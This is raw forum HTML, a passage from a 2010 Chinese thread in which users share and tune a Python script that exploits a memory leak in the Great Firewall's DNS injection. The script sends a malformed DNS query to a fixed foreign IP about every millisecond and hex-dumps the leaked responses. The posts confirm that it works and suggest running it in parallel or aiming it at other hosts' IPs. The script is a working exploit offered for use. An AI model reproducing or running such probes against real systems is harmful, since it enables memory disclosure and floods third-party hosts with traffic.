																											<div id="postmessage_860968" class="t_msgfont">python版本是多少？我这里是2.6，3.0可能会有问题。</div>

							
							
							
							
															<div id="post_rate_div_860968"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo860968_menu" style="display: none;">
										<dl></dl>
											<p><a href="https://www.google.com/reader/shared/lehui99" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=16496" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=860968&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 860968)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_38"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid861023" summary="pid861023" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16496" target="_blank" id="userinfo861023" class="dropmenu" onmouseover="showMenu(this.id)">lehui99</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16496">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16496&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_39" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum861023" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid861023', '话题链接已经复制到剪贴板')">40楼</strong>
													<em onclick="$('postmessage_861023').className='t_bigfont'">大</em>							<em onclick="$('postmessage_861023').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_861023').className='t_smallfont'">小</em>												发表于 2010-10-9 01:39&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16496" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_39"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_39"></div><div id="ad_thread4_39"></div>
						
						
																											<div id="postmessage_861023" class="t_msgfont">或者尝试一下修改版：<div class="blockcode"><em onclick="copycode($('code3'));">复制内容到剪贴板</em><h5>代码:</h5><code id="code3">import socket<br />
import binascii<br />
import time<br />
import threading<br />
<br />
class DataReceiver:<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;def __init__(self, s):<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; self.s = s<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;def __call__(self):<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; while True:<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;try:<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;r = s.recvfrom(65535)[0]<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;except:<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;continue<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;i = 0<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;while i &lt; len(r):<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;print '%04x:' % i,<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;p = list(r[i : i + 16])<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;for j in range(0, len(p)):<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; print binascii.b2a_hex(p[j]),<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; if p[j] &lt; ' ' or p[j] &gt; '~':<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;p[j] = '.'<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;print ' ' * ((15 - j) * 3),<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;print &quot;&quot;.join(p)<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;i += 16<br />
<br />
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br />
threading.Thread(target = DataReceiver(s)).start()<br />
while True:<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;s.sendto(&quot;\0\0\1\0\0\1\0\0\0\0\0\0\6wux.ru\377&quot;, (&quot;218.30.54.118&quot;, 53))<br />
&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;time.sleep(0.001)</code></div></div>

							
							
							
							
															<div id="post_rate_div_861023"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo861023_menu" style="display: none;">
										<dl></dl>
											<p><a href="https://www.google.com/reader/shared/lehui99" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=16496" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=861023&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 861023)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_39"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid861185" summary="pid861185" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12307" target="_blank" id="userinfo861185" class="dropmenu" onmouseover="showMenu(this.id)">tywtyw2002</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12307">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12307&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_40" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum861185" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid861185', '话题链接已经复制到剪贴板')">41楼</strong>
													<em onclick="$('postmessage_861185').className='t_bigfont'">大</em>							<em onclick="$('postmessage_861185').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_861185').className='t_smallfont'">小</em>												发表于 2010-10-9 07:52&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=12307" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_40"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_40"></div><div id="ad_thread4_40"></div>
						
						
																											<div id="postmessage_861185" class="t_msgfont">寫成&nbsp;&nbsp;c++吧</div>

							
							
							
							
															<div id="post_rate_div_861185"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo861185_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12307" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=861185&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 861185)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_40"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid861186" summary="pid861186" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=12307" target="_blank" id="userinfo861186" class="dropmenu" onmouseover="showMenu(this.id)">tywtyw2002</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=12307">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=12307&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_41" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum861186" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid861186', '话题链接已经复制到剪贴板')">42楼</strong>
													<em onclick="$('postmessage_861186').className='t_bigfont'">大</em>							<em onclick="$('postmessage_861186').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_861186').className='t_smallfont'">小</em>												发表于 2010-10-9 07:53&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=12307" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_41"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_41"></div><div id="ad_thread4_41"></div>
						
						
																											<div id="postmessage_861186" class="t_msgfont">不過返回數據有數量限制&nbsp;&nbsp;具體沒看&nbsp; &nbsp;應該是1個包的長度 2次返回的數據不連續&nbsp;&nbsp;<br />
返回的數據應該這個dns結果后面的ip數據 不過通過這些可以得到一些gfw的信息</div>

							
							
							
							
															<div id="post_rate_div_861186"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo861186_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=12307" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=861186&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 861186)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_41"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid862465" summary="pid862465" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16496" target="_blank" id="userinfo862465" class="dropmenu" onmouseover="showMenu(this.id)">lehui99</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16496">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16496&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_42" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum862465" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid862465', '话题链接已经复制到剪贴板')">43楼</strong>
													<em onclick="$('postmessage_862465').className='t_bigfont'">大</em>							<em onclick="$('postmessage_862465').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_862465').className='t_smallfont'">小</em>												发表于 2010-10-9 17:27&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16496" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_42"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_42"></div><div id="ad_thread4_42"></div>
						
						
																											<div id="postmessage_862465" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>tywtyw2002</i> 于 2010-10-9 07:52 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=861185&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
寫成&nbsp;&nbsp;c++吧 </blockquote></div>组里有谁会C++吗？能改写一下吗？<div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>tywtyw2002</i> 于 2010-10-9 07:53 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=861186&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
不過返回數據有數量限制&nbsp;&nbsp;具體沒看&nbsp; &nbsp;應該是1個包的長度 2次返回的數據不連續&nbsp;&nbsp;<br />
返回的數據應該這個dns結果后面的ip數據 不過通過這些可以得到一些gfw的信息 </blockquote></div>数据确实不连续，不过这也是GFW中内存的样子吧？</div>

							
							
							
							
															<div id="post_rate_div_862465"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo862465_menu" style="display: none;">
										<dl></dl>
											<p><a href="https://www.google.com/reader/shared/lehui99" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=16496" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=862465&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 862465)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_42"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid863182" summary="pid863182" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=13558" target="_blank" id="userinfo863182" class="dropmenu" onmouseover="showMenu(this.id)">十六夜小一</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=13558">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=13558&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_43" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum863182" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid863182', '话题链接已经复制到剪贴板')">44楼</strong>
													<em onclick="$('postmessage_863182').className='t_bigfont'">大</em>							<em onclick="$('postmessage_863182').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_863182').className='t_smallfont'">小</em>												发表于 2010-10-10 00:36&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=13558" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_43"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_43"></div><div id="ad_thread4_43"></div>
						
						
																											<div id="postmessage_863182" class="t_msgfont">( ⊙o⊙ 围观技术宅</div>

							
							
							
							
															<div id="post_rate_div_863182"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo863182_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=13558" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=863182&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 863182)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_43"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid863744" summary="pid863744" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=19477" target="_blank" id="userinfo863744" class="dropmenu" onmouseover="showMenu(this.id)">mycccc</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=19477">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=19477&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_44" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum863744" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid863744', '话题链接已经复制到剪贴板')">45楼</strong>
													<em onclick="$('postmessage_863744').className='t_bigfont'">大</em>							<em onclick="$('postmessage_863744').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_863744').className='t_smallfont'">小</em>												发表于 2010-10-10 11:46&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=19477" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_44"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_44"></div><div id="ad_thread4_44"></div>
													<h2>回复 40楼 lehui99 的话题</h2>
						
						
																											<div id="postmessage_863744" class="t_msgfont">2.6运行40楼修正版ok~</div>

							
							
							
							
															<div id="post_rate_div_863744"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo863744_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=19477" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=863744&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 863744)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_44"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid863766" summary="pid863766" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=19477" target="_blank" id="userinfo863766" class="dropmenu" onmouseover="showMenu(this.id)">mycccc</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=19477">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=19477&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_45" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum863766" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid863766', '话题链接已经复制到剪贴板')">46楼</strong>
													<em onclick="$('postmessage_863766').className='t_bigfont'">大</em>							<em onclick="$('postmessage_863766').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_863766').className='t_smallfont'">小</em>												发表于 2010-10-10 12:00&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=19477" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_45"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_45"></div><div id="ad_thread4_45"></div>
													<h2>回复 45楼 mycccc 的话题</h2>
						
						
																											<div id="postmessage_863766" class="t_msgfont">在powercmd里运行python脚本<br />
可以自动保存log<br />
方便查看<br />
<br />
5分钟1MB<br />
量不大啊</div>

							
							
							
							
															<div id="post_rate_div_863766"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo863766_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=19477" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=863766&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 863766)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_45"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid863985" summary="pid863985" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo863985" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_46" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum863985" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid863985', '话题链接已经复制到剪贴板')">47楼</strong>
													<em onclick="$('postmessage_863985').className='t_bigfont'">大</em>							<em onclick="$('postmessage_863985').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_863985').className='t_smallfont'">小</em>												发表于 2010-10-10 13:57&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_46"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_46"></div><div id="ad_thread4_46"></div>
						
						
																											<div id="postmessage_863985" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>mycccc</i> 于 2010-10-10 12:00 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=863766&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
在powercmd里运行python脚本<br />
可以自动保存log<br />
方便查看<br />
<br />
5分钟1MB<br />
量不大啊 </blockquote></div>dns一个包最大512字节。精通RFC 2671的想办法自己改吧。MTU弄大一点。。。但是估计就收不到了。其实这个溢出可以做成并发的。你可以躲开几个进程同时收集。<br />
<br />
[<i> 本帖最后由 id已被绿坝屏蔽 于 2010-10-10 13:58 编辑 </i>]</div>

							
							
							
							
															<div id="post_rate_div_863985"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo863985_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=863985&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 863985)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_46"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid864105" summary="pid864105" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16496" target="_blank" id="userinfo864105" class="dropmenu" onmouseover="showMenu(this.id)">lehui99</a></cite>
																		<p><em></em></p>
						<p></p>
																		
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16496">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16496&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_47" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum864105" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid864105', '话题链接已经复制到剪贴板')">48楼</strong>
													<em onclick="$('postmessage_864105').className='t_bigfont'">大</em>							<em onclick="$('postmessage_864105').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_864105').className='t_smallfont'">小</em>												发表于 2010-10-10 15:17&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16496" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_47"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_47"></div><div id="ad_thread4_47"></div>
						
						
																											<div id="postmessage_864105" class="t_msgfont">发现填写不同的国外IP能看到不同的内容，把python脚本中的IP：218.30.54.118换成其他的IP（比如yahoo.com的IP）会看到大部分不同的内容。</div>

							
							
							
							
															<div id="post_rate_div_864105"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo864105_menu" style="display: none;">
										<dl></dl>
											<p><a href="https://www.google.com/reader/shared/lehui99" target="_blank">查看个人网站</a></p>
										<p><a href="space.php?uid=16496" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=864105&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 864105)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_47"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid864126" summary="pid864126" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=6518" target="_blank" id="userinfo864126" class="dropmenu" onmouseover="showMenu(this.id)">id已被绿坝屏蔽</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">闃呭悗鍗崇剼</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=6518">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=6518&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_48" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum864126" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid864126', '话题链接已经复制到剪贴板')">49楼</strong>
													<em onclick="$('postmessage_864126').className='t_bigfont'">大</em>							<em onclick="$('postmessage_864126').className='t_msgfont'">中</em>
